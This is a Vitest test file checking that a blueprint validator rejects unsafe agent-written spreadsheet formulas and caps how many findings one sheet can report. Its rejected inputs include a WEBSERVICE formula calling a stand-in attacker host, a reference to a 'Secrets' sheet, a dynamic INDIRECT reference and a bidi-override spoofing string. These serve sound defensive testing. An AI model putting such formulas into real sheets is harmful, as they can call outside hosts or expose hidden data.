// @vitest-environment node
import { describe, expect, it } from 'vitest';
import { checkSheetDraft } from '../../sheets/src/model/index.ts';
import { buildCatalog } from '../src/build/build.ts';
import { discoverManifestGroups } from '../src/build/node.ts';
import { spreadsheetManifest } from '../src/manifests/sheets/index.ts';
import { renderCatalogFromBuild } from '../src/render/renderer/index.ts';
import {
  type DraftValidation,
  MAX_SHEET_FINDINGS,
  SPREADSHEET_ID,
  validateDraft,
} from '../src/validate/index.ts';

/**
 * Spreadsheets in blueprints (spec 0.8.0, ADR-015): a `spreadsheet` node is
 * checked by the host's sheet validator, which parses every agent formula
 * with the sheet grammar at draft time. Nothing is weakened: no validator,
 * no sheet.
 */

const build = await buildCatalog(await discoverManifestGroups());
const catalog = renderCatalogFromBuild(build.catalog);
const options = { catalog, checkSheet: checkSheetDraft, frameRoots: false as const };

const example = spreadsheetManifest.examples?.[0]?.props.sheet as {
  sheets: { cells: Record<string, unknown> }[];
} & Record<string, unknown>;
const tab = example.sheets[0] as { cells: Record<string, unknown> } & Record<string, unknown>;
const node = (cells: Record<string, unknown>) => ({
  key: 'budget',
  id: SPREADSHEET_ID,
  props: { sheet: { ...example, sheets: [{ ...tab, cells: { ...tab.cells, ...cells } }] } },
});
const codes = (result: DraftValidation) =>
  result.diagnostics.filter((d) => d.severity === 'error').map((d) => `${d.check}:${d.code}`);

describe('spreadsheets in validateDraft', () => {
  it('accepts the manifest example at the untrusted tier, and a draft with no sheet passes the check', () => {
    const result = validateDraft(node({}), options);
    expect(codes(result)).toEqual([]);
    expect(result.checks.sheets).toBe('pass');
    expect(build.catalog.tiers.untrusted).toContain('spreadsheet');
  });

  it('refuses every spreadsheet without the host validator (sheet-unchecked), nested too', () => {
    const alone = validateDraft(node({}), { catalog, frameRoots: false });
    expect(codes(alone)).toEqual(['sheets:sheet-unchecked']);
    expect(alone.checks.sheets).toBe('fail');
    const nested = validateDraft(
      { key: 'page', id: 'layout-doc', props: { title: 'Plan' }, children: [node({})] },
      { catalog }
    );
    expect(codes(nested)).toContain('sheets:sheet-unchecked');
  });

  it('refuses agent formulas the sheet grammar refuses, and unsafe or oversized sheets', () => {
    const cases: [string, Record<string, unknown>][] = [
      ['a syntax error', { E1: '=SUM(' }],
      ['an unknown function', { E1: '=WEBSERVICE("https://evil.example")' }],
      ['a dynamic reference', { E1: '=INDIRECT("A1")' }],
      ['a missing sheet', { E1: '=Secrets!A1' }],
      ['a bidi override', { E1: 'evil\u202Etxt' }],
      ['an address off the sheet', { Z99: 1 }],
      ['an object input', { E1: { html: '<b>' } }],
    ];
    for (const [label, cells] of cases) {
      const result = validateDraft(node(cells), options);
      expect(codes(result), label).toContain('sheets:sheet-schema');
      expect(result.ok, label).toBe(false);
    }
  });

  it('caps the findings one hostile sheet can report', () => {
    const cells = Object.fromEntries(Array.from({ length: 200 }, (_, i) => [`A${i + 1}`, '=SUM(']));
    const result = validateDraft(node({ ...cells }), {
      ...options,
      limits: { maxBytes: 1_000_000 },
    } as never);
    const findings = result.diagnostics.filter((d) => d.check === 'sheets');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.length).toBeLessThanOrEqual(MAX_SHEET_FINDINGS);
  });

  it('reports a throwing host validator instead of throwing', () => {
    const result = validateDraft(node({}), {
      ...options,
      checkSheet: () => {
        throw new Error('boom');
      },
    });
    expect(codes(result)).toEqual(['sheets:sheet-schema']);
  });
});
